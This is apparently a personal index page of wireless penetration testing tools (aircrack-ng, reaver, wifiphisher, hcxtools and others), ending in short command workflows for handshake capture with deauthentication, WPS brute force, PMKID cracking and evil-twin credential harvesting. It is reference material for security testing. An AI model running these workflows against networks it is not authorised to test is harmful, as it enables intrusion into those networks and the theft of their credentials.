---
tags: [index, wireless, wifi]
---

# Wireless Penetration Testing Tools Index

## Core Attack Tools

| Tool | Purpose |
|------|---------|
| [[aircrack-ng]] | Complete WiFi pentesting suite |
| [[wifite]] | Automated wireless attack tool |
| [[wifiphisher]] | Evil twin/credential harvesting |
| [[cowpatty]] | WPA handshake cracker |
| [[reaver]] | WPS PIN brute force |
| [[bully]] | Alternative WPS attack with Pixie-Dust |
| [[kismet]] | Wireless monitor/IDS |
| [[hcxtools]] | PMKID capture (no clients needed) |

## Enterprise WiFi

| Tool | Purpose |
|------|---------|
| [[eaphammer]] | Enterprise WPA2-Enterprise attacks |

## Embedded Devices

| Tool | Purpose |
|------|---------|
| [[routersploit]] | Router/embedded device exploitation |
| [[routerkeygenpc]] | Default WiFi key generator |

## Support Tools

| Tool | Purpose |
|------|---------|
| [[cewl]] | Custom wordlist generator |
| [[bulk-extractor]] | Digital forensics extraction |
| [[wapiti]] | Web vulnerability scanner |
| [[wireless-launcher]] | Monitor mode helper |

## Quick Attack Workflows

### WPA/WPA2 Handshake Capture
sudo ~/tools/wireless/launcher.sh
airodump-ng -c CH -b BSSID -w capture wlan0mon
aireplay-ng -0 5 -a BSSID wlan0mon
aircrack-ng -w wordlist.txt capture-01.cap

### WPS Attack
reaver -i wlan0mon -b BSSID -vv
bully wlan0mon -b BSSID --pixiewps

### PMKID Attack (No Client Needed)
hcxdumptool -i wlan0 -o capture.pcapng
hcxpcaptool -z hashes.txt capture.pcapng
hashcat -m 16800 hashes.txt wordlist.txt

### Evil Twin Attack
wifiphisher
eaphammer --wpa2-enterprise -i wlan0

### Custom Wordlist
cewl -d 3 -m 6 -w wordlist.txt https://target.com
